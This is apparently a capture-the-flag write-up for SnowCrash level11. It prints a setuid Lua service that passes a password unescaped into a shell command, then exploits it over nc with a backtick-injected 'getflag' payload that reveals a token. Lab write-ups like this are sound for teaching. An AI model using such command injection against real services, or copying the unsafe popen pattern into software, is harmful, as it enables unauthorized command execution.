a misspelling of the su flag10 > su flag11, in the previous lvl let us asscess to the flag11 user

But we will play the game, we suppose that we have to find the exploit of this lvl

However it's still weird...


level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua

we can observe that there's a posibility to transfer right of the user flag11 to user level11

level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end

first intuition is to go to the dcode website and try de decrypt it 
https://www.dcode.fr/fonction-hash
tring to decript the "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" > NotSoEasy

let's see the source code

it's seems that there's a process that is listening in the port 5151 waiting for messages

the pocess read form the stream and hash the pass with sha1sum 

and then the process uses the echo command without any protection and pip it to the sha1sum command

so we can exploit this to run the getflag command through it

nc ip 5151
level11@SnowCrash:~$ nc localhost 5151
Password: `getflag > /tmp/test`
Erf nope..
level11@SnowCrash:~$ cat /tmp/test
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
